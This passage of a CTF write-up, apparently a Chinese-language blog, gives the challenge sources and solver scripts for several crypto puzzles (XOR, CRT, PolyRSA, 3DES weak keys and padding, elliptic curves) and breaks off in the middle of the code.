msg</code><br>直接解:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> xor</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c1 = <span class="string">b&#x27;\xdbi\xab\x8d\xfb0\xd3\xfe!\xf8Xpy\x80w\x8c\x87\xb9&#x27;</span></span><br><span class="line">c2 = <span class="string">b&#x27;o\xb0%\xfb\xdb\x0e\r\x04\xde\xd1\x9a\x08w\xda4\x0f\x0cR&#x27;</span></span><br><span class="line">c3 = <span class="string">b&#x27;\xe7\x80\xcd\ria\xb2\xca\x89\x1a\x9d;|#3\xf7\xbb\x96&#x27;</span></span><br><span class="line"></span><br><span class="line">k2 = xor(c1,c2)</span><br><span class="line">flag = xor(c3,k2)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># SYC&#123;I_l0v3_Crypt0&#125;</span></span><br></pre></td></tr></table></figure><h2 id="OldAlgorithm"><a href="#OldAlgorithm" class="headerlink" title="OldAlgorithm"></a>OldAlgorithm</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> * </span><br><span class="line"><span class="keyword">import</span> os </span><br><span class="line">flag = <span class="string">b&quot;SYC&#123;Al3XEI_FAKE_FLAG&#125;&quot;</span></span><br><span class="line"></span><br><span class="line">pad = <span class="keyword">lambda</span> msg,padlen: msg+os.urandom(padlen-<span class="built_in">len</span>(msg))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag = pad(flag,<span class="number">32</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(flag))</span><br><span class="line">p = [getPrime(<span class="number">16</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>)] </span><br><span class="line">c = [bytes_to_long(flag)%i <span class="keyword">for</span> i <span class="keyword">in</span> p] </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;p=&#x27;</span>,p)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;c=&#x27;</span>,c)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">p= [58657, 47093, 47963, 41213, 57653, 56923, 41809, 49639, 44417, 38639, 39857, 53609, 55621, 41729, 60497, 44647, 39703, 55117, 44111, 57131, 37747, 63419, 63703, 64007, 46349, 39241, 39313, 44909, 40763, 46727, 34057, 56333]</span></span><br><span class="line"><span class="string">c= [36086, 4005, 3350, 23179, 34246, 5145, 32490, 16348, 13001, 13628, 7742, 46317, 50824, 23718, 32995, 7640, 10590, 46897, 39245, 16633, 31488, 36547, 42136, 52782, 31929, 34747, 29026, 18748, 6634, 9700, 8126, 5197]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>就是CRT 就当复习下sage用法了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">p= [<span class="number">58657</span>, <span class="number">47093</span>, <span class="number">47963</span>, <span class="number">41213</span>, <span class="number">57653</span>, <span class="number">56923</span>, <span class="number">41809</span>, <span class="number">49639</span>, <span class="number">44417</span>, <span class="number">38639</span>, <span class="number">39857</span>, <span class="number">53609</span>, <span class="number">55621</span>, <span class="number">41729</span>, <span class="number">60497</span>, <span class="number">44647</span>, <span class="number">39703</span>, <span class="number">55117</span>, <span class="number">44111</span>, <span class="number">57131</span>, <span class="number">37747</span>, <span class="number">63419</span>, <span class="number">63703</span>, <span class="number">64007</span>, <span class="number">46349</span>, <span class="number">39241</span>, <span class="number">39313</span>, <span class="number">44909</span>, <span class="number">40763</span>, <span class="number">46727</span>, <span class="number">34057</span>, <span class="number">56333</span>]</span><br><span class="line">c= [<span class="number">36086</span>, <span class="number">4005</span>, <span class="number">3350</span>, <span class="number">23179</span>, <span class="number">34246</span>, <span class="number">5145</span>, <span class="number">32490</span>, <span class="number">16348</span>, <span class="number">13001</span>, <span class="number">13628</span>, <span class="number">7742</span>, <span class="number">46317</span>, <span class="number">50824</span>, <span class="number">23718</span>, <span class="number">32995</span>, <span class="number">7640</span>, <span class="number">10590</span>, <span class="number">46897</span>, <span class="number">39245</span>, <span class="number">16633</span>, <span class="number">31488</span>, <span class="number">36547</span>, <span class="number">42136</span>, <span class="number">52782</span>, <span class="number">31929</span>, <span class="number">34747</span>, <span class="number">29026</span>, <span class="number">18748</span>, <span class="number">6634</span>, <span class="number">9700</span>, <span class="number">8126</span>, <span class="number">5197</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># print(CRT_list[c,p])</span></span><br><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> *</span><br><span class="line">flag = <span class="number">37699681561344853433172597523387281471904607566697320008840601281159457436694</span></span><br><span class="line"><span class="built_in">print</span>(n2s(<span class="built_in">int</span>(flag)))</span><br><span class="line"><span class="comment"># b&#x27;SYC&#123;CRT_1s_s0_ju1cy!&#125;]mC\x9c\xf9C/\xfc\xb8t\x16&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="PolyRSA"><a href="#PolyRSA" class="headerlink" title="PolyRSA"></a>PolyRSA</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *  </span><br><span class="line">flag = <span class="string">b&quot;SYC&#123;Al3XEI_FAKE_FLAG&#125;&quot;</span></span><br><span class="line">p,q = [getPrime(<span class="number">2048</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="string">&quot;__&quot;</span>] </span><br><span class="line">e1,e2 = [getPrime(<span class="number">17</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="string">&quot;__&quot;</span>] </span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">n = p*q </span><br><span class="line">c1 = gmpy2.powmod(<span class="number">2</span>*p + <span class="number">3</span>*q,e1,n)</span><br><span class="line">c2 = gmpy2.powmod(<span class="number">5</span>*p + <span class="number">7</span>*q,e2,n) </span><br><span class="line">c = gmpy2.powmod(bytes_to_long(flag),e,n) </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;e1=&quot;</span>,e1)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;e2=&quot;</span>,e2) </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c1=&quot;</span>,c1) </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c2=&quot;</span>,c2) </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c=&quot;</span>,c)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n=&quot;</span>,n)</span><br><span class="line"></span><br><span class="line"><span class="comment">#e1= 113717</span></span><br><span class="line"><span class="comment">#e2= 80737</span></span><br><span class="line"><span class="comment">#c1= 97528398828294138945371018405777243725957112272614466238005409057342884425132214761228537249844134865481148636534134025535106624840957740753950100180978607132333109806554009969378392835952544552269685553539656827070349532458156758965322477969141073720173165958341043159560928836304172136610929023123638981560836183245954461041167802574206323129671965436040047358250847178930436773249800969192016749684095882580749559014647942135761757750292281205876241566597813517452803933496218995755905344070203047797893640399372627351254542342772576533524820435965479881620338366838326652599102311019884528903481310690767832417584600334987458835108576322111553947045733143836419313427495888019352323209000292825566986863770366023326755116931788018138432898323148059980463407567431417724940484236335082696026821105627826117901730695680967455710434307270501190258033004471156993017301443803372029004817834317756597444195146024630164820841200575179112295902020141040090350486764038633257871003899386340004440642516190842086462237559715130631205046041819931656962904630367121414263911179041905140516402771368603623318492074423223885367923228718341206283572152570049573607906130786276734660847733952210105659707746969830132429975090175091281363770357</span></span><br><span class="line"><span class="comment">#c2= 353128571201645377052005694809874806643786163076931670184196149901625274899734977100920488129375537186771931435883114557320913415191396857882995726660784707377672210953334914418470453787964899846194872721616628198368241044602144880543115393715025896206210152190007408112767478800650578941849344868081146624444817544806046188600685873402369145450593575618922226415069043442295774369567389939040265656574664538667552522329712111984168798829635080641332045614585247317991581514218486004191829362787750803153463482021229058714990823658655863245025037102127138472397462755776598314247771125981017814912049441827643898478473451005083533693951329544115861795587564408860828213753948427321483082041546722974666875065831843384005041800692983406353922680299538080900818930589336142421748023025830846906503542594380663429947801329079870530727382679634952272644949425079242992486832995962516376820051495641486546631849426876810933393153871774796182078367277299340503872124124714036499367887886486264658590613431293656417255355575602576047502506125375605713228912611320198066713358654181533335650785578352716562937038768171269136647529849805172492594142026261051266577821582011917001752590659862613307646536049830151262848916867223615064832279222</span></span><br><span class="line"><span class="comment">#c= 375617816311787295279632219241669262704366237192565344884527300748210925539528834207344757670998995567820735715933908541800125317082581328287816628816752542104514363629022246620070560324071543077301256917337165566677142545053272381990573611757629429857842709092285442319141751484248315990593292618113678910350875156232952525787082482638460259354559904243062546518553607882194808191571131590524874275187750985821420412987586148770397073003186510357920710387377990379862185266175190503647626248057084923516190642292152259727446111686043531725993433395002330208067534104745851308178560234372373476331387737629284961288204368572750848248186692623500372605736825205759172773503283282321274793846281079650686871355211691681512637459986684769598186821524093789286661348936784712071312135814683041839882338235290487868969391040389837253093468883093296547473466050960563347060307256735803099039921213839491129726807647623542881247210251994139130146519265086673883077644185971830004165931626986486648581644383717994174627681147696341976767364316172091139507445131410662391699728189797082878876950386933926807186382619331901457205957462337191923354433435013338037399565519987793880572723211669459895193009710035003369626116024630678400746946356</span></span><br><span class="line"><span class="comment">#n= 728002565949733279371529990942440022467681592757835980552797682116929657292509059813629423038094227544032071413317330087468458736175902373398210691802243764786251764982802000867437756347830992118278032311046807282193498960587170291978547754942295932606784354258945168927044376692224049202979158068158842475322825884209352566494900083765571037783472505580851500043517614314755340168507097558967372661966013776090657685241689631615245294004694287660685274079979318342939473469143729494106686592347327776078649315612768988028622890242005700892937828732613800620455225438339852445425046832904615827786856105112781009995862999853122308496903885748394541643702103368974605177097553007573113536089894913967154637055293769061726082740854619536748297829779639633209710676774371525146758917646731487495135734759201537358734170552231657257498090553682791418003138924472103077035355223367678622115314235119493397080290540006942708439607767313672671274857069053688258983103863067394473084183472609906612056828326916114024662795812611685559034285371151973580240723680736227737324052391721149957542711415812665358477474058103338801398214688403784213100455466705770532894531602252798634923125974783427678469124261634518543957766622712661056594132089</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>观察题目给的两个多项式 都是p,q线性组合的形式 那么modn的话就可以把交叉项消掉<br>这种跟羊城杯有一道一模一样<br>展成只有p,q幂次的两个式子分别e2,e1次方<br>然后乘对应系数消元 求个gcd即可分解n</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">e1= <span class="number">113717</span></span><br><span class="line">e2= <span class="number">80737</span></span><br><span class="line">c1= </span><br><span class="line">c2= </span><br><span class="line">c= </span><br><span class="line">n= </span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> primefac <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> gcd</span><br><span class="line"></span><br><span class="line">kq = (<span class="built_in">pow</span>(c1,e2,n)*<span class="built_in">pow</span>(<span class="number">5</span>,e1*e2,n)-<span class="built_in">pow</span>(c2,e1,n)*<span class="built_in">pow</span>(<span class="number">2</span>,e1*e2,n))</span><br><span class="line">q = gcd(kq,n)</span><br><span class="line"><span class="built_in">print</span>(q)</span><br><span class="line">p = n//q</span><br><span class="line"><span class="keyword">assert</span> p*q == n</span><br><span class="line">d = modinv(e,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(c,d,n)))</span><br><span class="line"><span class="comment"># b&#x27;SYC&#123;poly_rsa_Just_need5_s1mple_gcd&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="Simple3DES"><a href="#Simple3DES" class="headerlink" title="Simple3DES"></a>Simple3DES</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> DES3</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">xor = <span class="keyword">lambda</span> a,b: <span class="built_in">bytes</span>([a[i % <span class="built_in">len</span>(a)] ^ b[i % <span class="built_in">len</span>(b)] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">max</span>(<span class="built_in">len</span>(a), <span class="built_in">len</span>(b)))])</span><br><span class="line">pad = <span class="keyword">lambda</span> msg,padlen: msg+<span class="built_in">chr</span>((padlen-(<span class="built_in">len</span>(msg)%padlen))).encode()*(padlen-(<span class="built_in">len</span>(msg)%padlen))</span><br><span class="line"></span><br><span class="line">flag = os.environ.get(<span class="string">&quot;FLAG&quot;</span>, <span class="string">&quot;SYC&#123;Al3XEI_FAKE_FLAG&#125;&quot;</span>).encode()</span><br><span class="line">sec = os.urandom(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">banner = <span class="string">&#x27;|&#x27;</span>*<span class="number">70</span></span><br><span class="line"></span><br><span class="line">DEBUG = <span class="literal">False</span> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">proof_of_work</span>():</span><br><span class="line">    <span class="keyword">if</span> DEBUG:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    proof = <span class="string">&#x27;&#x27;</span>.join([random.choice(string.ascii_letters+string.digits) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>)])</span><br><span class="line">    digest = hashlib.sha256(proof.encode()).hexdigest()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;sha256(XXXX+%s) == %s&quot;</span> % (proof[<span class="number">4</span>:], digest))</span><br><span class="line">    x = <span class="built_in">input</span>(<span class="string">&quot;Give me XXXX: &quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(x)!=<span class="number">4</span> <span class="keyword">or</span> hashlib.sha256((x+proof[<span class="number">4</span>:]).encode()).hexdigest() != digest:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Right!&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">enc</span>(<span class="params">msg,key</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        key = long_to_bytes(key)</span><br><span class="line">        msg = xor(long_to_bytes(msg),sec)</span><br><span class="line">        des = DES3.new(key,DES3.MODE_ECB)</span><br><span class="line">        ct = xor(des.encrypt(pad(msg,<span class="number">8</span>)),sec)</span><br><span class="line">        <span class="keyword">return</span> bytes_to_long(ct)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line">        <span class="keyword">return</span> Exception</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">service</span>():</span><br><span class="line">    cnt = <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> proof_of_work():</span><br><span class="line">        exit()</span><br><span class="line">    <span class="built_in">print</span>(banner)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Simple DES Encryption Service&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(banner)</span><br><span class="line">    <span class="keyword">while</span> cnt&lt;<span class="number">2</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;1. Encrypt\n2. Get encrypted flag.&#x27;</span>)</span><br><span class="line">        choice = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;&gt; &#x27;</span>))</span><br><span class="line">        <span class="keyword">if</span> choice == <span class="number">1</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;Input msg:&#x27;</span>)</span><br><span class="line">            msg = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;&gt; &#x27;</span>).strip())</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;Input key:&#x27;</span>)</span><br><span class="line">            key = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;&gt; &#x27;</span>).strip())</span><br><span class="line">            <span class="built_in">print</span>(enc(msg,key))</span><br><span class="line">        <span class="keyword">elif</span> choice == <span class="number">2</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;Input key:&#x27;</span>)</span><br><span class="line">            key = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;&gt; &#x27;</span>).strip())</span><br><span class="line">            <span class="built_in">print</span>(enc(bytes_to_long(flag),key))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            exit()</span><br><span class="line">        cnt+=<span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(banner)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Bye!&#x27;</span>)</span><br><span class="line">    exit()</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    service()</span><br><span class="line"><span class="keyword">except</span> Exception:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Something goes wrong...\n&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(banner+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    exit()</span><br></pre></td></tr></table></figure><p>没靶机 就单纯学习一下吧~ (最近要恶补交互题 :(  🫥qaq )<br>题目给了个<a href="https://blog.csdn.net/Mr_wzc/article/details/121713518" target = "_blank">学习链接 </a><br>题目中在3DES加密结束后还有个 <code>ct = xor(des.encrypt(pad(msg,8)),sec)</code> 再xor了一次</p><h3 id="Solution1"><a href="#Solution1" class="headerlink" title="Solution1"></a>Solution1</h3><p>学习到了一个新知识:DES弱密钥 <a href="https://lightless.me/archives/DES-Weak-Keys.html">https://lightless.me/archives/DES-Weak-Keys.html</a><br>用这些弱密钥加密会导致</p><ul><li>明文连续加密两次仍然是明文</li><li>密文连续解密两次仍然是密文</li></ul><p>那么利用3DES一个三次操作 加密-解密-加密   解密-加密-解密<br>只要构造 <code>key1=key3</code><br>第一次交互选择 2:</p><ul><li>enc(flag,k1)</li><li>dec(flag,k2)</li><li>enc(flag,k3)</li><li>xor(flag,sec)</li></ul><p>这样相当于得到的是 encflag &#x3D; dec(flag,k2)^sec 的值</p><p>第二次交互选择 1:</p><ul><li>enc(encflag,k1)</li><li>dec(encflag,k2)</li><li>enc(encflag,k3)</li><li>xor(encflag,sec)</li></ul><p>这样就得到 dec(dec(flag,k2),k2)^sec^sec &#x3D; flag</p><p>这里选择 弱密钥拼接成key (其实我最开始想的三个key全取一样也行 只是要选择弱密钥来拼接)<br><code>key = b&quot;\x01\x01\x01\x01\x01\x01\x01\x01&quot;+b&quot;\xFE\xFE\xFE\xFE\xFE\xFE\xFE\xFE&quot;+b&quot;\x01\x01\x01\x01\x01\x01\x01\x01&quot;</code></p><h3 id="Solution2"><a href="#Solution2" class="headerlink" title="Solution2"></a>Solution2</h3><p>注意到加密的时候对msg进行了pad填充<br>我们发送一个空字符串过去时</p><ul><li>sec + b’\x08’*8</li><li>3DES</li><li>xor sec</li></ul><p>利用<code>enc[-8:]</code>是3DES(b’\x08’*8) xor sec 这一点便可以反解出 sec</p><p>总结一下其实好多与DES&#x2F;AES相关的交互题破题点常常在padding上 (Do not leak your padding status !)</p><h2 id="Energetic-Carcano"><a href="#Energetic-Carcano" class="headerlink" title="Energetic_Carcano"></a>Energetic_Carcano</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># from sage.all import *</span></span><br><span class="line"><span class="keyword">import</span> os </span><br><span class="line"><span class="keyword">import</span> random </span><br><span class="line"><span class="keyword">import</span> string </span><br><span class="line"><span class="keyword">import</span> hashlib </span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> * </span><br><span class="line"></span><br><span class="line">DEBUG = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">banner = <span class="string">&#x27;|&#x27;</span>*<span class="number">70</span> </span><br><span class="line">flag = os.environ.get(<span class="string">&quot;FLAG&quot;</span>, <span class="string">b&quot;SYC&#123;Al3XEI_FAKE_FLAG&#125;&quot;</span>).encode()</span><br><span class="line">pbits = <span class="number">120</span></span><br><span class="line">abp = <span class="string">&quot;abp&quot;</span> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">proof_of_work</span>(): </span><br><span class="line">    <span class="keyword">if</span> DEBUG:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    proof = <span class="string">&#x27;&#x27;</span>.join([random.choice(string.ascii_letters+string.digits) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>)])</span><br><span class="line">    digest = hashlib.sha256(proof.encode()).hexdigest()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;sha256(XXXX+%s) == %s&quot;</span> % (proof[<span class="number">4</span>:], digest))</span><br><span class="line">    x = <span class="built_in">input</span>(<span class="string">&quot;Give me XXXX: &quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(x)!=<span class="number">4</span> <span class="keyword">or</span> hashlib.sha256((x+proof[<span class="number">4</span>:]).encode()).hexdigest() != digest: </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Right!&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">a,b,p,turn,ans</span>):</span><br><span class="line">    <span class="keyword">if</span> DEBUG:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span> </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> turn == <span class="string">&quot;a&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">int</span>(a) == ans </span><br><span class="line">        <span class="keyword">if</span> turn == <span class="string">&quot;b&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">int</span>(b) == ans</span><br><span class="line">        <span class="keyword">if</span> turn == <span class="string">&quot;p&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">int</span>(p) == ans  </span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        exit()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>: </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> proof_of_work():</span><br><span class="line">        exit() </span><br><span class="line">    <span class="built_in">print</span>(banner) </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;\nHi Crypto-ers! AL3XEI here. I know you are excellent at math, so I prepared a game for u.&#x27;</span>) </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;In the equation y^2 = x^3+ a*x + b (mod p), 4 points are given. Plz give me the right a, b or p to contine the game.&#x27;</span>) </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Good Luck!\n&#x27;</span>) </span><br><span class="line">    <span class="built_in">print</span>(banner+<span class="string">&#x27;\n&#x27;</span>) </span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        turn = random.choice(abp) </span><br><span class="line">        p = getPrime(pbits) </span><br><span class="line">        a,b = [next_prime(random.randint(<span class="number">2</span>,p)) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="string">&quot;ab&quot;</span>] </span><br><span class="line">        curve = EllipticCurve(GF(p),[a,b]) </span><br><span class="line">        pts = [curve.random_point() <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)]</span><br><span class="line">        pts = [(_[<span 